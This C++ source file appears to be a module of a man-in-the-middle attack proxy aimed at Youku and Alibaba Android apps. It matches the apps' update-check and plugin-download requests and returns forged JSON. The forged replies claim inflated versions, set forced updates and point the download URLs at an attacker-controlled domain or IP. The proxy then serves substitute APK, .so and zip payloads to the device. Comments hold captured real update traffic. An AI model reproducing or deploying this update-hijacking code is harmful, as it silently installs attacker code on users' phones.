
#include "Youku.h"
#include "PluginServer.h"
#include "../attacker.h"
#include <string.h>
#include <stdlib.h>
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpPartial.h"
#include "../Public.h"

using namespace std;


int gYoukuFlag = 0;


string getField(char * flag, char * end, char * second, const char * lpbuf) {
	char * m_lpfield = strstr((char*)lpbuf, flag);
	if (m_lpfield == FALSE)
	{
		return "";
	}

	m_lpfield += lstrlenA(flag);

	char * lpend = strstr(m_lpfield, end);
	if (lpend == FALSE)
	{
		lpend = strstr(m_lpfield, second);
		if (lpend == FALSE)
		{
			return "";
		}
	}

	int m_fieldlen = lpend - m_lpfield;
	return string(m_lpfield,m_fieldlen);
}

int Youku::isYoukuApk(string url, string host) {
	if (strstr(host.c_str(), "open.sjzs-api.25pp.com") == FALSE) {
		return FALSE;
	}

	if (strstr(url.c_str(), "/api/op.rec.app.checkUpdate"))
	{
		return TRUE;
	}

	return FALSE;
}

int Youku::replyYoukuApk(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp,const char * httpdata) {
	int ret = 0;
	int curver = 999;
	string strver = "9.9.9";

	string szip = string(MYOWNSITE_ATTACK_DOMAINNAME) + "/" + lphttp->username;
	//string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string fn = "youkuplugin.apk";
	string filename = Public::getUserPluginPath(lphttp->username)  + fn;

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64];
	int filesize = CryptoUtils::getUpdateFileMd5( filename, szmd5,hexmd5,TRUE);
	if (filesize <= 0)
	{
		return FALSE;
	}

	string userid = getField("\"id\":", ",", "}", httpdata);

	//settingid = 2167 9999
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"data\":"
		"{\"app\":"
		"{\"appId\":-1,\"versionCode\":\"%u\",\"productId\":\"2015\",\"packageName\":\"com.pp.sdk.apk\",\"versionName\":\"%s\","
		"\"updateDes\":\"youku sdk store plugin version\","
		"\"downloadUrl\":\"http://%s/%s?settingId\\u003d2424\\u0026targetUrl\\u003dhttp%%3A%%2F%%2F%s%%2F%s\\u0026size\\u003d%u\\u0026md5\\u003d%s\","

		"\"updateTime\":%I64u,\"size\":%u,\"isForceUpdate\":1,\"name\":\"\","
		"\"ip\":\"%s\","
		"\"iconUrl\":\"\",\"trailUpdate\":0,\"backgroundImg\":\"\"},\"isNeedUpdate\":1},"
		"\"id\":\"%s\",\"state\":{\"code\":2000000,\"msg\":\"Ok\",\"tips\":\"\"}}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, curver, strver.c_str(),
		szip.c_str(), fn.c_str(), szip.c_str(), fn.c_str(), filesize, szmd5,
		time(0) * 1000, filesize, HttpUtils::getIPstr(gServerIP).c_str(), userid.c_str());
	int retlen = sprintf_s(recvBuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "youku reply:%s\r\n", lpRespContent);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}

int Youku::isYouku(string url, string host) {
	if (strstr(host.c_str(), "appdownload.alicdn.com") || strstr(host.c_str(),"appdownload.youku.com")) {
		if (strstr(url.c_str(), "/bundle/") && strstr(url.c_str(), "/libcom_youku_android_youkusetting.so") )
		{
			gYoukuFlag = 1;
			return TRUE;
		}
		else if (strstr(url.c_str(), "/bundle/") && strstr(url.c_str(), "/libcom_aligame_gamecenter_api.so"))
		{
			gYoukuFlag = 2;
			return TRUE;
		}
	}

	return FALSE;
}

int Youku::replyYouku(char*recvBuffer, int len, int buflimit, LPSSLPROXYPARAM pstSSLProxyParam) {
	

	string filename = "";
	if (gYoukuFlag == 1)
	{
		filename = Public::getUserUrl(pstSSLProxyParam->username, "youkusetting.apk");
	}else if (gYoukuFlag == 2)
	{
		filename = Public::getUserUrl(pstSSLProxyParam->username, "youkugamecenter.apk");
	}


	int begin = 0;
	int end = 0;
	int ret = HttpUtils::getRange(recvBuffer, begin, end);
	if (ret == 0)
	{
		//char * szHttpPartialFormat = "HTTP/1.1 206 Partial Content\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\n"
		//	"Content-Range: bytes %u-%u/%u\r\n"
		//	"Content-Length: %u\r\n\r\n";
		//ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpPartialFormat, begin,end,1);
		ret = HttpPartial::AliCdnPartialFile(filename, pstSSLProxyParam, begin, end);
	}
	else {
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
		ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
	}
	return 0;
}


//pns.alicdn.com
int Youku::isYoukuVod(string url, string host) {
	if (strstr(host.c_str(), "pns.alicdn.com") == FALSE) {
		return FALSE;
	}

	///pcdn/s/check?
	if (strstr(url.c_str(), "/pcdn/s/check") )
	{
		return TRUE;
	}

	return FALSE;
}


int Youku::replyYoukuVod(char*lpbuffer, int len, int buflimit, LPSSLPROXYPARAM pstSSLProxyParam) {
	int ret = 0;

	string fullver = "std_99.9.1.2142";		//std_9.3.1.2142
	string ver = "99.9.1.2142";				//9.3.1.2142

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + pstSSLProxyParam->username;

	//string strip = string(MYOWNSITE_ATTACK_DOMAINNAME) + "/" + pstSSLProxyParam->username;

	char szfilemd5[256] = { 0 };
	unsigned char hex1md5[256] = { 0 };
	string filename = "libvod_android-mobile_armeabi-v7a.zip";
	string filepathname = Public::getUserPluginPath(pstSSLProxyParam->username) + filename;
	int filesize = CryptoUtils::getUpdateFileMd5(filepathname, szfilemd5, hex1md5, FALSE);

	char * lpRespContentFormat =
		"{\"code\":0,\"nextcheck\":18000000,\"nextcheck_acc_lived\":\"30000000\",\"recheck_miner_periods\":\"00:00-24:00\","
		"\"restart_acc_times\":1,\"restart_mode\":0,"
		"\"text\":\"success\",\"vod\":{\"arch\":\"armeabi-v7a\",\"code\":1,\"dw_p2p\":0,\"file_size\":%u,"
		"\"file_url\":\"http://%s/%s\","
		"\"full_version\":\"%s\",\"md5\":\"%s\",\"start\":1,\"switch_log\":0,\"up_upglog\":0,\"version\":\"%s\"}}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, filesize,
		strip.c_str(), filename.c_str(), fullver.c_str(), szfilemd5,ver.c_str());

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
		//"Server: nginx/1.12.2\r\n"
		//"Date: Tue, 19 Feb 2099 13:10:01 GMT\r\n"
		//"EagleEye-TraceId: 0bc13a2b15505818011264026e3037\r\n"
		//"Strict-Transport-Security: max-age=4096\r\n"
		//"Timing-Allow-Origin: *\r\n"
		"Connection: keep-alive\r\n\r\n%s";
	int respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return respsize;
}


/*
POST /pcdn/s/check?os_name=android&ttype=android-mobile&type=vod&version=9.3.1.11150&os_version=6.0.1&client_id=6000aa01005c495a9e86d41212fc1e15bf16550d9e97f746e9&app_name=UC%E6%B5%8F%E8%A7%88%E5%99%A8&app_version=12.8.9.1069&arch=armeabi-v7a&phy_mem=192&disk=true&pid=1&my_version=4.2.1 HTTP/1.1
Connection: Keep-Alive
Charset: UTF-8
Content-Type: application/x-www-form-urlencoded
User-Agent: PCDN
Host: pns.alicdn.com
Accept-Encoding: gzip
Content-Length: 0

HTTP/1.1 200 OK
Date: Mon, 09 Mar 2020 19:44:42 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 205
Connection: keep-alive
Server: nginx/1.12.2
EagleEye-TraceId: 0bc1ef0915837830821288393e13c2
Strict-Transport-Security: max-age=0
Timing-Allow-Origin: *

{"code":0,"nextcheck":4800,"nextcheck_acc_lived":"300","recheck_miner_periods":"01:30-05:00","restart_acc_times":1,"restart_mode":0,"text":"鎴愬姛","vod":{"code":0,"start":1,"switch_log":1,"up_upglog":1}}

POST /pcdn/s/check?os_name=android&ttype=android-mobile&type=vod&version=9.3.1.1310&os_version=8.1.0&client_id=200000010057aad98651336b6f1bf864c1dd694e87754f3be4&app_name=%E4%BC%98%E9%85%B7%E8%A7%86%E9%A2%91&app_version=7.6.4&arch=armeabi-v7a&phy_mem=384&disk=true&pid=1&my_version=4.1.1 HTTP/1.1
Connection: Keep-Alive
Charset: UTF-8
Content-Type: application/x-www-form-urlencoded
User-Agent: PCDN
Host: pns.alicdn.com
Accept-Encoding: gzip
Content-Length: 0

HTTP/1.1 200 OK
Date: Tue, 19 Feb 2019 13:10:01 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 452
Connection: keep-alive
Server: nginx/1.12.2
EagleEye-TraceId: 0bc13a2b15505818011264026e3037
Strict-Transport-Security: max-age=0
Timing-Allow-Origin: *

{"code":0,"nextcheck":1800,"nextcheck_acc_lived":"300","recheck_miner_periods":"01:30-05:00","restart_acc_times":1,"restart_mode":0,
"text":"成功","vod":{"arch":"armeabi-v7a","code":1,"dw_p2p":0,"file_size":1801686,
"file_url":"http://pus.alicdn.com/kernal/sdkcontrol/vod_android-mobile_armeabi-v7a_9.3.1.2142.jpg",
"full_version":"std_9.3.1.2142","md5":"A0642D64CAD9F6F3C6FA9E269CF7A4C5","start":1,"switch_log":0,"up_upglog":1,"version":"9.3.1.2142"}}

{"code":0,"nextcheck":1800,"nextcheck_acc_lived":"300","recheck_miner_periods":"01:30-05:00","restart_acc_times":1,"restart_mode":0,
"text":"成功","vod":{"arch":"armeabi-v7a","code":1,"dw_p2p":0,"file_size":1900912,
"file_url":"http://pus.alicdn.com/kernal/sdkcontrol/beta/vod_android-mobile_armeabi-v7a_9.3.1.10220.jpg",
"full_version":"beta_9.3.1.10220","md5":"CD29CF65A504E58863B7A0F5BE4A1AEE","start":1,"switch_log":0,"up_upglog":1,"version":"9.3.1.10220"}}
*/


/*
GET /bundle/6d4e5ca523a1c8e3ff763f2f2954f2fe/libcom_youku_laifeng_sdk.so HTTP/1.1
Range: bytes=0-
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: appdownload.youku.com
Connection: Keep-Alive
Accept-Encoding: gzip

ssl first packet:GET /bundle/7a1b2c5ca070ded9d951f1517d47718a/libcom_youku_planet_community.so HTTP/1.1
Range: bytes=0-
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: appdownload.youku.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 206 Partial Content
Server: Tengine
Content-Type: application/octet-stream
Content-Length: 2139836
Connection: keep-alive
Date: Sun, 17 Mar 2019 08:07:32 GMT
x-oss-request-id: 5C8E004460097C1B1124C3D6
Accept-Ranges: bytes
ETag: "7A1B2C5CA070DED9D951F1517D47718A"
Last-Modified: Mon, 11 Mar 2019 13:32:21 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 17303062625939742082
x-oss-storage-class: Standard
Content-MD5: ehssXKBw3tnZUfFRfUdxig==
x-oss-server-time: 64
Via: cache11.l2cm9[0,304-0,H], cache38.l2cm9[0,0], cache6.cn1320[0,206-0,H], cache7.cn1320[1,0]
Ali-Swift-Global-Savetime: 1552354979
Age: 5779
X-Cache: HIT TCP_MEM_HIT dirn:4:169414398
X-Swift-SaveTime: Sun, 17 Mar 2019 09:06:03 GMT
X-Swift-CacheTime: 3600
Content-Range: bytes 0-2139835/2139836
Access-Control-Allow-Origin: *
Timing-Allow-Origin: *
EagleId: 700dd49b15528158318997770e

*/